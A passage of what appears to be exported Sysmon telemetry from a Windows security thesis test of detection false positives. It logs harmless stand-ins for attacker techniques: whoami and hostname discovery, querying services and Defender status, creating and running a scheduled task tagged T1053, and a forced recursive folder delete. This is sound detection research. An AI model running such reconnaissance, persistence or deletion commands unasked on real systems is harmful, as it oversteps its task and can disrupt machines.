 ""UtcTime"": ""2026-07-12 12:55:42.542"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c005-000000009a01}"",
 ""ProcessId"": 5028,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\cmd.exe\"" /c \""dir \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\FP_WORKSPACE\\TFM_FP_20260712_145541\""\"""",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.6711133Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:42.609"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c105-000000009a01}"",
 ""ProcessId"": 11668,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\cmd.exe\"" /c whoami"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.698479Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:42.635"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c205-000000009a01}"",
 ""ProcessId"": 7312,
 ""Image"": ""C:\\Windows\\System32\\whoami.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""whoami - displays logged on user information"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""whoami.exe"",
 ""CommandLine"": ""whoami"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88"",
 ""ParentProcessGuid"": ""{6bc49a7d-8ece-6a53-c105-000000009a01}"",
 ""ParentProcessId"": ""11668"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\system32\\cmd.exe\"" /c whoami"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.7984136Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:42.747"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c305-000000009a01}"",
 ""ProcessId"": 6488,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\cmd.exe\"" /c hostname"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.8270951Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:42.778"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c405-000000009a01}"",
 ""ProcessId"": 11352,
 ""Image"": ""C:\\Windows\\System32\\HOSTNAME.EXE"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Hostname APP"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""hostname.exe"",
 ""CommandLine"": ""hostname"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78"",
 ""ParentProcessGuid"": ""{6bc49a7d-8ece-6a53-c305-000000009a01}"",
 ""ParentProcessId"": ""6488"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\system32\\cmd.exe\"" /c hostname"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.8817309Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:42.832"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c505-000000009a01}"",
 ""ProcessId"": 5396,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\cmd.exe\"" /c \""echo TFM_FP_20260712_145541 FP-002\"""",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.9461244Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:42.891"",
 ""ProcessGuid"": ""{6bc49a7d-8ece-6a53-c605-000000009a01}"",
 ""ProcessId"": 9072,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\schtasks.exe\"" /Create /TN \\TFM_FP_TFM_FP_20260712_145541_FP-003 /TR \""cmd.exe /c echo TFM_FP_20260712_145541 FP-003 scheduled task ok \u003e \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\FP_WORKSPACE\\TFM_FP_20260712_145541\\FP-003_scheduled_task_ok.txt\""\"" /SC ONCE /ST 15:00 /F"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,11,2026-07-12T12:56:06.0026937Z,"{
 ""RuleName"": ""T1053"",
 ""UtcTime"": ""2026-07-12 12:55:42.964"",
 ""ProcessGuid"": ""{6bc49a7d-7994-6a53-1b00-000000009a01}"",
 ""ProcessId"": 1320,
 ""Image"": ""C:\\Windows\\system32\\svchost.exe"",
 ""TargetFilename"": ""C:\\Windows\\System32\\Tasks\\TFM_FP_TFM_FP_20260712_145541_FP-003"",
 ""CreationUtcTime"": ""2026-07-12 12:55:42.964"",
 ""User"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:06.0685842Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:43.038"",
 ""ProcessGuid"": ""{6bc49a7d-8ecf-6a53-c705-000000009a01}"",
 ""ProcessId"": 3984,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\schtasks.exe\"" /Run /TN \\TFM_FP_TFM_FP_20260712_145541_FP-003"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:06.1297828Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:43.091"",
 ""ProcessGuid"": ""{6bc49a7d-8ecf-6a53-c805-000000009a01}"",
 ""ProcessId"": 11412,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /c echo TFM_FP_20260712_145541 FP-003 scheduled task ok \u003e C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\FP_WORKSPACE\\TFM_FP_20260712_145541\\FP-003_scheduled_task_ok.txt"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-66ca-280000000000}"",
 ""LogonId"": ""0x28CA66"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""Medium"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7994-6a53-1b00-000000009a01}"",
 ""ParentProcessId"": ""1320"",
 ""ParentImage"": ""C:\\Windows\\System32\\svchost.exe"",
 ""ParentCommandLine"": ""C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"",
 ""ParentUser"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:09.1808582Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:46.742"",
 ""ProcessGuid"": ""{6bc49a7d-8ed2-6a53-ca05-000000009a01}"",
 ""ProcessId"": 8604,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\schtasks.exe\"" /Delete /TN \\TFM_FP_TFM_FP_20260712_145541_FP-003 /F"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:09.503314Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:47.129"",
 ""ProcessGuid"": ""{6bc49a7d-8ed3-6a53-cb05-000000009a01}"",
 ""ProcessId"": 260,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -NoProfile -Command \""$ErrorActionPreference = 'Stop'\n$rid = 'TFM_FP_20260712_145541'\n$fp = 'FP-005'\nGet-Service | Select-Object -First 10 | Out-Null\nsc.exe query | Out-Null\nWrite-Output \""$rid $fp service query ok\""\"""",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,11,2026-07-12T12:56:09.8859419Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:47.598"",
 ""ProcessGuid"": ""{6bc49a7d-8ed3-6a53-cb05-000000009a01}"",
 ""ProcessId"": 260,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0b00sha1.fyw.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:55:47.598"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:10.2121387Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:47.992"",
 ""ProcessGuid"": ""{6bc49a7d-8ed3-6a53-cc05-000000009a01}"",
 ""ProcessId"": 8500,
 ""Image"": ""C:\\Windows\\System32\\sc.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Service Control Manager Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""sc.exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\sc.exe\"" query"",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",
 ""ParentProcessGuid"": ""{6bc49a7d-8ed3-6a53-cb05-000000009a01}"",
 ""ParentProcessId"": ""260"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -NoProfile -Command \""$ErrorActionPreference = 'Stop'\n$rid = 'TFM_FP_20260712_145541'\n$fp = 'FP-005'\nGet-Service | Select-Object -First 10 | Out-Null\nsc.exe query | Out-Null\nWrite-Output \""$rid $fp service query ok\""\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:10.3054562Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:48.096"",
 ""ProcessGuid"": ""{6bc49a7d-8ed4-6a53-cd05-000000009a01}"",
 ""ProcessId"": 11756,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -NoProfile -Command \""$ErrorActionPreference = 'Stop'\n$rid = 'TFM_FP_20260712_145541'\n$fp = 'FP-006'\n$mp = Get-Command Get-MpComputerStatus -ErrorAction SilentlyContinue\nif ($null -ne $mp) { Get-MpComputerStatus | Out-Null }\nGet-Process -Name SecurityHealthSystray,MsMpEng -ErrorAction SilentlyContinue | Out-Null\nWrite-Output \""$rid $fp security discovery ok\""\"""",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,11,2026-07-12T12:56:10.4855752Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:48.308"",
 ""ProcessGuid"": ""{6bc49a7d-8ed4-6a53-cd05-000000009a01}"",
 ""ProcessId"": 11756,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_va0fs3w3.bzo.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:55:48.308"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:12.9832529Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:51.301"",
 ""ProcessGuid"": ""{6bc49a7d-8ed7-6a53-cf05-000000009a01}"",
 ""ProcessId"": 10624,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -NoProfile -Command \""$ErrorActionPreference = 'Stop'\n$rid = 'TFM_FP_20260712_145541'\n$fp = 'FP-008'\n\u0026 'Remove-Item' -LiteralPath 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\FP_WORKSPACE\\TFM_FP_20260712_145541\\FP-008' -Recurse -Force\nWrite-Output \""$rid $fp controlled delete ok\""\"""",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,11,2026-07-12T12:56:13.2808437Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:51.682"",
 ""ProcessGuid"": ""{6bc49a7d-8ed7-6a53-cf05-000000009a01}"",
 ""ProcessId"": 10624,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_qx3r342h.frw.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:55:51.682"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:18.1396088Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:57.740"",
 ""ProcessGuid"": ""{6bc49a7d-8edd-6a53-d205-000000009a01}"",
 ""ProcessId"": 10604,
 ""Image"": ""C:\\Windows\\System32\\svchost.exe"",
 ""FileVersion"": ""10.0.19041.1806 (WinBuild.160101.0800)"",
 ""Description"": ""Host Process for Windows Services"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""svchost.exe"",
 ""CommandLine"": ""C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""NT AUTHORITY\\SYSTEM"",
 ""LogonGuid"": ""{6bc49a7d-7991-6a53-e703-000000000000}"",
 ""LogonId"": ""0x3E7"",
 ""TerminalSessionId"": ""0"",
 ""IntegrityLevel"": ""System"",
 ""Hashes"": ""MD5=B7F884C1B74A263F746EE12A5F7C9F6A,SHA256=ADD683A6910ABBBF0E28B557FAD0BA998166394932AE2ACA069D9AA19EA8FE88,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"",
 ""ParentProcessGuid"": ""{6bc49a7d-7991-6a53-0b00-000000009a01}"",
 ""ParentProcessId"": ""772"",
 ""ParentImage"": ""C:\\Windows\\System32\\services.exe"",
 ""ParentCommandLine"": ""C:\\Windows\\system32\\services.exe"",
 ""ParentUser"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:31.1249818Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:56:15.539"",
 ""ProcessGuid"": ""{6bc49a7d-8eef-6a53-d305-000000009a01}"",
 ""ProcessId"": 11276,
 ""Image"": ""C:\\Windows\\System32\\dllhost.exe"",
